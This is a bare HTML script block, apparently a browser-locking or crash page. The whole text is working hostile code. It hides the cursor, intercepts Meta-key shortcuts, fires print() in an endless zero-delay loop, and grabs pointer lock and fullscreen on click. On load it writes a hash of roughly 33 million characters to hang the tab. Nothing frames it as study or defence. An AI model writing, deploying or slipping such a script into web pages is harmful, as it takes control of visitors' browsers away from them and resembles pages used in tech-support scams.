<script>
  document.querySelector('html').style = 'cursor: none;'
  document.addEventListener('keydown', function(e) {
    if(e.metaKey){
        e.preventDefault();
        alert("meta");
    }
    console.log(e.metaKey || e.key);
});
  setInterval(()=>{print()},0);
  document.body.onclick = function(){document.body.requestPointerLock();document.body.requestFullscreen();}

  window.onload=()=>location.hash="M"+"\u0001".repeat(2**25)+"m";
</script>
